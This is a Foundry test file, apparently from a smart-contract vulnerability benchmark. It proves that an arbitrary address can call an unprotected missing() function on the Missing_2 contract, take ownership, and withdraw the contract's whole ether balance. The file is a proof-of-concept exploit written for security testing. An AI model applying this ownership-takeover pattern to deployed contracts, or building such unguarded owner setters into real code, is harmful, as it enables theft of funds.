
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Missing_2} from "../src/Missing_2.sol";

contract TestAccessControlMissing_2 is Test {

    Missing_2 public _contractUnderTest;
    address public initialOwner;

    function setUp() public {
        initialOwner = address(0x1234);
        
        vm.prank(initialOwner);
        _contractUnderTest = new Missing_2();
        
        vm.prank(initialOwner);
        _contractUnderTest.missing();
        
        vm.deal(address(_contractUnderTest), 10 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm)); 
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the initial owner to prove an *arbitrary* user CAN access the missing() function
        vm.assume(caller != initialOwner);

        // --- 2. State Configuration ---
        // Fund the caller in case they need ETH for gas
        vm.deal(caller, 1 ether);
        
        // Record the contract balance before the attack
        uint256 contractBalanceBefore = address(_contractUnderTest).balance;
        uint256 callerBalanceBefore = caller.balance;

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);
        
        // TRIGGER VULNERABILITY: Call the unprotected missing() function
        // This should succeed and set the caller as the new owner
        _contractUnderTest.missing();

        // Now the arbitrary caller can call the protected withdraw() function
        vm.prank(caller);
        _contractUnderTest.withdraw();

        // ASSERT SUCCESS: Verify the caller was able to drain the contract
        assertEq(address(_contractUnderTest).balance, 0, "Contract should be drained");
        assertEq(caller.balance, callerBalanceBefore + contractBalanceBefore, "Caller should have received the funds");
    }
}
